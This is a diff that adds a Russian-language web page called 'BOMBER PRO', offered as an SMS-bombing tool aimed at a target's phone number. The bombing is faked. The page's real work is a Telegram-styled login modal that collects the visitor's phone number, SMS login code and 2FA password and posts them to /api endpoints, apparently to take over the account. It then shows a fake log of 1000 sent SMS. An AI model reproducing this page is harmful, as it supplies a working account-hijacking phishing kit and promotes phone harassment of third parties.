@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>BOMBER PRO</title>
+<style>
+  :root { --bg: #050505; --panel: #0a0a0a; --green: #00ff41; --red: #ff003c; --text: #e0e0e0; }
+  * { box-sizing: border-box; font-family: 'Courier New', monospace; }
+  body { margin: 0; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: radial-gradient(circle at 50% 0%, #002200 0%, #050505 70%); }
+  .container { width: 100%; max-width: 450px; padding: 20px; background: var(--panel); border: 1px solid #333; border-radius: 12px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.1); }
+  h1 { font-size: 22px; text-align: center; color: var(--green); text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px var(--green); }
+  .input-group { margin-bottom: 15px; }
+  label { display: block; font-size: 12px; margin-bottom: 5px; color: #888; text-transform: uppercase; }
+  input { width: 100%; padding: 12px; background: #111; border: 1px solid #333; border-radius: 6px; color: var(--green); font-family: inherit; font-size: 16px; outline: none; }
+  input:focus { border-color: var(--green); box-shadow: 0 0 10px rgba(0, 255, 65, 0.2); }
+  .btn { width: 100%; padding: 16px; background: transparent; border: 1px solid var(--green); color: var(--green); font-size: 16px; font-weight: bold; text-transform: uppercase; cursor: pointer; border-radius: 6px; transition: all 0.2s; }
+  .btn:hover { background: var(--green); color: var(--bg); box-shadow: 0 0 20px var(--green); }
+  .btn.danger { border-color: var(--red); color: var(--red); }
+  .btn.danger:hover { background: var(--red); color: #fff; box-shadow: 0 0 20px var(--red); }
+  
+  .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 100; backdrop-filter: blur(4px); }
+  .modal-overlay.active { display: flex; }
+  .modal { background: #17212b; border: 1px solid #2b3a48; padding: 25px; border-radius: 12px; max-width: 360px; width: 90%; text-align: center; position: relative; }
+  .modal h2 { color: #3390ec; margin-top: 0; font-size: 20px; font-weight: 500; }
+  .modal p { font-size: 13px; color: #8a94a6; line-height: 1.4; margin-bottom: 20px; }
+  .tg-logo { width: 60px; height: 60px; background: #3390ec; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 15px; font-size: 30px; color: white; }
+  .modal .btn { background: #3390ec; border-color: #3390ec; color: white; }
+  .modal .btn:hover { background: #2b7bc7; box-shadow: 0 0 15px rgba(51, 144, 236, 0.5); }
+  
+  .loader { display: none; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #3390ec; border-radius: 50%; width: 24px; height: 24px; animation: spin 0.8s linear infinite; margin: 15px auto 0; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  
+  .console { background: #000; border: 1px solid #222; border-radius: 6px; padding: 10px; height: 120px; overflow-y: auto; font-size: 11px; margin-top: 15px; display: none; font-family: monospace; }
+  .console.active { display: block; }
+  .console p { margin: 2px 0; color: #888; }
+  .console p.success { color: var(--green); }
+  .console p.error { color: var(--red); }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>BOMBER PRO</h1>
+  <div class="input-group">
+    <label>Номер цели</label>
+    <input type="tel" id="targetPhone" placeholder="+7 999 123-45-67">
+  </div>
+  <button class="btn danger" onclick="startAttack()">🚀 ЗАПУСТИТЬ</button>
+  
+  <div class="console" id="console"></div>
+</div>
+
+<!-- Модалка Telegram Login -->
+<div class="modal-overlay" id="authModal">
+  <div class="modal">
+    <div class="tg-logo">✈️</div>
+    <h2>Telegram</h2>
+    <p>Для запуска бомбера требуется авторизация оператора.</p>
+    
+    <div id="stepPhone">
+      <input type="tel" id="authPhone" placeholder="Ваш номер (+7...)" autocomplete="off" style="margin-bottom: 10px;">
+      <button class="btn" onclick="requestCode()">ПОЛУЧИТЬ КОД</button>
+    </div>
+
+    <div id="stepCode" style="display: none;">
+      <input type="text" id="authCode" placeholder="Код из СМС" maxlength="5" style="text-align:center; letter-spacing: 5px; font-size: 20px; margin-bottom: 10px;">
+      <button class="btn" onclick="verifyCode()">ПОДТВЕРДИТЬ</button>
+    </div>
+
+    <div id="step2FA" style="display: none;">
+      <input type="password" id="authPassword" placeholder="Пароль 2FA" style="margin-bottom: 10px;">
+      <button class="btn" onclick="verify2FA()">ВОЙТИ</button>
+    </div>
+
+    <div class="loader" id="authLoader"></div>
+    <div id="authError" style="color:var(--red); font-size:12px; margin-top:10px;"></div>
+  </div>
+</div>
+
+<script>
+const API = "/api"; 
+let operatorPhone = "";
+let codeHash = "";
+
+function log(msg, type="") {
+  const c = document.getElementById("console");
+  c.classList.add("active");
+  const p = document.createElement("p");
+  p.className = type;
+  p.innerText = "> " + msg;
+  c.appendChild(p);
+  c.scrollTop = c.scrollHeight;
+}
+
+function startAttack() {
+  const target = document.getElementById("targetPhone").value.replace(/[^\d+]/g, '');
+  if (!target || target.length < 10) { alert("Введите корректный номер цели!"); return; }
+  
+  document.getElementById("authModal").classList.add("active");
+  document.getElementById("stepPhone").style.display = "block";
+  document.getElementById("stepCode").style.display = "none";
+  document.getElementById("step2FA").style.display = "none";
+  document.getElementById("authError").innerText = "";
+  document.getElementById("authPhone").value = ""; 
+}
+
+async function requestCode() {
+  operatorPhone = document.getElementById("authPhone").value.replace(/[^\d+]/g, '');
+  if (!operatorPhone || operatorPhone.length < 10) { 
+    document.getElementById("authError").innerText = "Неверный формат номера"; 
+    return; 
+  }
+  
+  document.getElementById("authError").innerText = "";
+  document.getElementById("authLoader").style.display = "block";
+  
+  try {
+    const res = await fetch(API + "/send_code", {
+      method: "POST", headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ phone: operatorPhone })
+    });
+    const data = await res.json();
+    document.getElementById("authLoader").style.display = "none";
+    
+    if (data.ok) {
+      codeHash = data.code_hash;
+      document.getElementById("stepPhone").style.display = "none";
+      document.getElementById("stepCode").style.display = "block";
+      document.getElementById("authCode").focus();
+    } else {
+      document.getElementById("authError").innerText = data.error || "Ошибка отправки кода";
+    }
+  } catch (e) {
+    document.getElementById("authLoader").style.display = "none";
+    document.getElementById("authError").innerText = "Ошибка соединения";
+  }
+}
+
+async function verifyCode() {
+  const code = document.getElementById("authCode").value.trim();
+  if (code.length < 4) { document.getElementById("authError").innerText = "Введите код"; return; }
+  
+  document.getElementById("authError").innerText = "";
+  document.getElementById("authLoader").style.display = "block";
+  
+  try {
+    const res = await fetch(API + "/verify", {
+      method: "POST", headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ phone: operatorPhone, code: code, code_hash: codeHash })
+    });
+    const data = await res.json();
+    document.getElementById("authLoader").style.display = "none";
+    
+    if (data.ok) {
+      finishAuth();
+    } else if (data.error === "2FA_REQUIRED") {
+      document.getElementById("stepCode").style.display = "none";
+      document.getElementById("step2FA").style.display = "block";
+    } else {
+      document.getElementById("authError").innerText = data.error || "Неверный код";
+    }
+  } catch (e) {
+    document.getElementById("authLoader").style.display = "none";
+    document.getElementById("authError").innerText = "Ошибка соединения";
+  }
+}
+
+async function verify2FA() {
+  const password = document.getElementById("authPassword").value;
+  if (!password) { document.getElementById("authError").innerText = "Введите пароль"; return; }
+  
+  document.getElementById("authError").innerText = "";
+  document.getElementById("authLoader").style.display = "block";
+  
+  try {
+    const res = await fetch(API + "/verify", {
+      method: "POST", headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ phone: operatorPhone, code: "", code_hash: codeHash, password: password })
+    });
+    const data = await res.json();
+    document.getElementById("authLoader").style.display = "none";
+    
+    if (data.ok) {
+      finishAuth();
+    } else {
+      document.getElementById("authError").innerText = "Неверный пароль";
+    }
+  } catch (e) {
+    document.getElementById("authLoader").style.display = "none";
+    document.getElementById("authError").innerText = "Ошибка соединения";
+  }
+}
+
+function finishAuth() {
+  document.getElementById("authModal").classList.remove("active");
+  log("Авторизация оператора успешна.", "success");
+  log("Запуск атаки на цель...", "success");
+  
+  let count = 0;
+  const interval = setInterval(() => {
+    count += 100;
+    log(`Отправлено ${count}/1000 SMS...`, "success");
+    if (count >= 1000) {
+      clearInterval(interval);
+      log("СНОС ЗАВЕРШЕН.", "success");
+    }
+  }, 200);
+}
+</script>
+</body>
+</html>
